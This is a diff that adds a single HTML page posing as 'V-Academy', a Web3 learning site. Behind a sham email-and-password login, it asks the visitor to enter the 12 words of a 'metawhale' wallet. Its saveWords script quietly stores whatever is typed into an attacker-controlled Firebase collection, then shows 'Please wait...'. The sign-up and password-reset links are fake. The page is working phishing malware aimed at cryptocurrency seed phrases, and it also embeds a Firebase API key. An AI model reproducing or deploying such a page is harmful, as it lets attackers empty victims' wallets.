@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>V-ACADEMY</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial;
+  background: linear-gradient(#8ec5fc, #e0c3fc);
+}
+
+/* common */
+.page { display: none; height: 100vh; padding: 20px; }
+.active { display: block; }
+
+.top {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+}
+
+.menu-btn, .support-btn {
+  background: #eee;
+  padding: 10px 20px;
+  border-radius: 30px;
+  border: none;
+}
+
+/* page1 */
+.hero {
+  text-align: center;
+  margin-top: 50px;
+}
+.hero h1 {
+  font-size: 60px;
+}
+
+/* menu page */
+.menu-list {
+  margin-top: 50px;
+}
+.menu-list div {
+  margin: 20px 0;
+  font-size: 22px;
+}
+
+/* login page */
+.input {
+  width: 100%;
+  padding: 15px;
+  border-radius: 30px;
+  border: 1px solid #ccc;
+  margin-top: 10px;
+}
+
+.btn {
+  margin-top: 20px;
+  padding: 15px;
+  border-radius: 30px;
+  border: none;
+  background: #3a8dde;
+  color: white;
+  width: 100%;
+}
+
+.center {
+  text-align: center;
+}
+
+/* textarea page */
+textarea {
+  width: 100%;
+  height: 200px;
+  border-radius: 20px;
+  padding: 15px;
+  border: 1px solid #ccc;
+}
+</style>
+</head>
+
+<body>
+
+<!-- PAGE 1 -->
+<div id="page1" class="page active">
+  <div class="top">
+    <img src="https://cdn-icons-png.flaticon.com/512/54/54481.png" class="logo">
+    <button class="menu-btn" onclick="openPage(2)">☰ Menu</button>
+  </div>
+
+  <div class="hero">
+    <h1>V-Academy</h1>
+  </div>
+</div>
+
+<!-- PAGE 2 -->
+<div id="page2" class="page">
+  <div class="top">
+    <img src="https://cdn-icons-png.flaticon.com/512/54/54481.png" class="logo">
+    <button onclick="openPage(1)">✖</button>
+  </div>
+
+  <div class="menu-list">
+    <div onclick="alert('Coming soon')">Ecosystem</div>
+    <div onclick="alert('Coming soon')">How Learning Works</div>
+    <div onclick="alert('Coming soon')">Certificate</div>
+  </div>
+
+  <button class="btn" onclick="openPage(3)">Log in</button>
+</div>
+
+<!-- PAGE 3 -->
+<div id="page3" class="page">
+  <div class="top">
+    <img src="https://cdn-icons-png.flaticon.com/512/54/54481.png" class="logo">
+    <button class="support-btn" onclick="alert('Firstly login your account')">Support</button>
+  </div>
+
+  <div class="center">
+    <h2>Welcome to V-Academy</h2>
+    <p>Your journey into the world of Web3 starts here</p>
+  </div>
+
+  <label>Email</label>
+  <input id="email" class="input" placeholder="Email">
+
+  <label>Password</label>
+  <div style="position:relative;">
+    <input id="password" type="password" class="input" placeholder="Password">
+    <span onclick="togglePass()" style="position:absolute; right:15px; top:20px;">👁️</span>
+  </div>
+
+  <div onclick="alert('Reset link sent to your gmail')" style="text-align:right; color:blue;">
+    Forgot password?
+  </div>
+
+  <button class="btn" onclick="login()">Log in</button>
+
+  <div class="center">
+    Do not have an account?
+    <span onclick="alert('This account is already exist')" style="color:blue;">Sign Up</span>
+  </div>
+</div>
+
+<!-- PAGE 4 -->
+<div id="page4" class="page">
+  <div class="center">
+    <h2>login your metawhale account<br>here with 12 words</h2>
+  </div>
+
+  <textarea id="words"></textarea>
+
+  <button class="btn" onclick="saveWords()">Log in</button>
+</div>
+
+<script type="module">
+
+// Firebase
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
+  authDomain: "v-academy-82560.firebaseapp.com",
+  projectId: "v-academy-82560",
+  storageBucket: "v-academy-82560.firebasestorage.app",
+  messagingSenderId: "826822771378",
+  appId: "1:826822771378:web:5357b1b989b298a8027fab"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// navigation
+window.openPage = function(num){
+  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+  document.getElementById("page"+num).classList.add("active");
+}
+
+// password toggle
+window.togglePass = function(){
+  let p = document.getElementById("password");
+  p.type = p.type === "password" ? "text" : "password";
+}
+
+// login validation
+window.login = function(){
+  let email = document.getElementById("email").value;
+  let pass = document.getElementById("password").value;
+
+  if(email === ""){
+    alert("Email required");
+    return;
+  }
+
+  let strong = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).+$/;
+  if(!strong.test(pass)){
+    alert("Password must contain uppercase, lowercase and number");
+    return;
+  }
+
+  openPage(4);
+}
+
+// save words
+window.saveWords = async function(){
+  let words = document.getElementById("words").value;
+
+  if(words === ""){
+    alert("Enter words");
+    return;
+  }
+
+  await addDoc(collection(db, "V-academy"), {
+    words: words,
+    time: new Date()
+  });
+
+  alert("Please wait...");
+}
+
+</script>
+
+</body>
+</html>
